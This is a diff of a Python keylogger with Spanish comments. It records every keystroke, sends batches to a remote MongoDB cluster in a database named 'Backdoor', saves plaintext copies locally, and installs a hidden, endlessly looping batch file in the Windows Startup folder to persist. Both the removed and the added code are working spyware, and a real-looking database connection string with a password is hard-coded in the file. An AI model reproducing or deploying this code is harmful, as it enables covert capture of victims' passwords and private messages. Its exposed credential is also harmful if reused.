@@ -1,71 +1,28 @@
 import os
 import threading
 import time
-from pynput import keyboard
 from pymongo import MongoClient
+from pynput import keyboard
 import datetime
-from cryptography.fernet import Fernet  # Instalar: pip install cryptography
-
-# Ruta del archivo Python actual
-current_script = os.path.abspath(__file__)
-
-# Ruta del archivo .bat para inicio automático
-startup_folder = os.getenv('APPDATA') + r'\Microsoft\Windows\Start Menu\Programs\Startup'
-bat_file_path = os.path.join(startup_folder, 'run_keylogger.bat')
-
-# Clave de cifrado para los datos
-encryption_key = Fernet.generate_key()
-cipher_suite = Fernet(encryption_key)
 
 # Configuración de MongoDB
 mongo_uri = "mongodb+srv://iraldejordan10:r5dcxq5RHNDrxt69@jarviscluster.et2fo.mongodb.net/"
 client = MongoClient(mongo_uri)
-db = client["keylogger_db"]
-collection = db["keystrokes2"]
+db = client["Backdoor"]
+collection = db["keylogger"]
 
-# Control de sesiones y variables de estado
+# Variables de control
 keystrokes = []
-current_session_id = None
+session_id = datetime.datetime.utcnow().isoformat()
 start_time = time.time()
-session_timeout = 600  # 10 minutos de inactividad para considerar una nueva sesión
+max_chars_per_batch = 100  # Número de caracteres antes de guardar
+max_idle_time = 600        # Tiempo máximo de inactividad para iniciar una nueva sesión
+save_interval = 300        # Intervalo de guardado automático en segundos (5 minutos)
+last_saved = time.time()   # Último tiempo de guardado
 
-def create_startup_file():
-    bat_content = f'''@echo off
-                        where python >nul 2>nul
-                        if %ERRORLEVEL% neq 0 (
-                            echo Python no está instalado. Instale Python.
-                            exit /b
-                        )
-
-                        rem Instalar dependencias
-                        python -m pip install --upgrade pip
-                        pip install pynput pymongo cryptography
-
-                        set "PYTHON_SCRIPT={current_script}"
-                        powershell -windowstyle hidden -command "try {{ python '{current_script}' }} catch {{ exit 1 }}"
-
-                        :inicio
-                        python %PYTHON_SCRIPT%
-                        goto inicio
-'''
-    with open(bat_file_path, 'w') as bat_file:
-        bat_file.write(bat_content)
-    print(f'Archivo de inicio creado en: {bat_file_path}')
-
-def initialize_new_session():
-    """Inicia una nueva sesión cuando se detecta inactividad."""
-    global current_session_id
-    current_session_id = datetime.datetime.utcnow().isoformat()
-
-def on_press(key):
-    """Maneja la captura de teclas con categorización."""
-    global start_time
-    categorized_key = categorize_key(key)
-    keystrokes.append(categorized_key)
-    start_time = time.time()  # Actualizar el tiempo de última actividad
-
+# Función para categorizar las teclas presionadas
 def categorize_key(key):
-    """Clasifica teclas en categorías y caracteres específicos."""
+    """Clasifica teclas en caracteres normales y especiales."""
     try:
         return {'type': 'character', 'value': key.char}
     except AttributeError:
@@ -81,40 +38,88 @@ def categorize_key(key):
         }
         return {'type': 'special', 'value': special_keys.get(key, 'UNKNOWN')}
 
-def store_keystrokes():
-    """Guarda los datos de teclas presionadas en MongoDB si se cumplen ciertas condiciones."""
+# Función que maneja la pulsación de teclas
+def on_press(key):
+    """Registra las teclas presionadas."""
     global start_time
+    categorized_key = categorize_key(key)
+    keystrokes.append(categorized_key)
+    start_time = time.time()
+
+# Función para guardar los datos de las teclas presionadas
+def save_keystrokes():
+    """Guarda las teclas en MongoDB y en el archivo local cada cierto tiempo."""
+    global start_time, last_saved
     while True:
-        time.sleep(5)  # Verificar cada 5 segundos
+        time.sleep(5)  # Revisa las condiciones cada 5 segundos
 
-        # Comprobar si se cumplen las condiciones de almacenamiento
-        if keystrokes and (len(keystrokes) >= 100 or (time.time() - start_time) >= session_timeout):
-            # Encriptar los datos y almacenarlos
-            encrypted_data = cipher_suite.encrypt(str(keystrokes).encode())
+        if keystrokes and (len(keystrokes) >= max_chars_per_batch or (time.time() - last_saved) >= save_interval):
+            # Guardar en la base de datos
             timestamp = datetime.datetime.utcnow()
-
             collection.insert_one({
-                "session_id": current_session_id,
+                "session_id": session_id,
                 "timestamp": timestamp,
-                "encrypted_text": encrypted_data
+                "keystrokes": keystrokes.copy()  # Copia para evitar conflictos
             })
 
-            # Reiniciar la sesión después de almacenar los datos
+            # Guardar en archivo local
+            output_file = f'C:\\Users\\{os.getlogin()}\\Desktop\\jarvis_data\\keystrokes_{timestamp}.txt'
+            os.makedirs(os.path.dirname(output_file), exist_ok=True)
+            with open(output_file, 'a') as file:
+                for record in keystrokes:
+                    file.write(f"{record['value']}")
+            
+            # Reiniciar las teclas y actualizar el tiempo
             keystrokes.clear()
-            initialize_new_session()
+            last_saved = time.time()
 
+        # Si hay inactividad, reinicia la sesión
+        if (time.time() - start_time) >= max_idle_time:
+            start_new_session()
+
+# Función para iniciar una nueva sesión (cuando hay inactividad)
+def start_new_session():
+    """Inicia una nueva sesión de captura cuando el usuario está inactivo por un tiempo determinado."""
+    global session_id
+    session_id = datetime.datetime.utcnow().isoformat()
+
+# Función para crear un archivo de inicio automático (si es necesario)
+def create_startup_file():
+    bat_content = f'''@echo off
+                        where python >nul 2>nul
+                        if %ERRORLEVEL% neq 0 (
+                            echo Python no está instalado. Instale Python.
+                            exit /b
+                        )
+
+                        python -m pip install --upgrade pip
+                        pip install pynput pymongo
+
+                        set "PYTHON_SCRIPT={os.path.abspath(__file__)}"
+                        powershell -windowstyle hidden -command "try {{ python '{os.path.abspath(__file__)}' }} catch {{ exit 1 }}"
+
+                        :inicio
+                        python %PYTHON_SCRIPT%
+                        goto inicio
+'''
+    bat_file_path = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup', 'run_keylogger.bat')
+    with open(bat_file_path, 'w') as bat_file:
+        bat_file.write(bat_content)
+    print(f'Archivo de inicio creado en: {bat_file_path}')
+
+# Función principal del keylogger
 def main():
-    """Configuración principal del keylogger."""
-    initialize_new_session()  # Comenzar la primera sesión
-    store_thread = threading.Thread(target=store_keystrokes)
-    store_thread.daemon = True
-    store_thread.start()
+    """Configuración principal del keylogger y ejecución de los hilos."""
+    start_new_session()
+    save_thread = threading.Thread(target=save_keystrokes)
+    save_thread.daemon = True
+    save_thread.start()
 
-    # Escuchar las teclas en segundo plano
+    # Iniciar el listener de teclado
     with keyboard.Listener(on_press=on_press) as listener:
         listener.join()
 
 if __name__ == "__main__":
-    if not os.path.isfile(bat_file_path):
+    if not os.path.isfile(os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup', 'run_keylogger.bat')):
         create_startup_file()
     main()
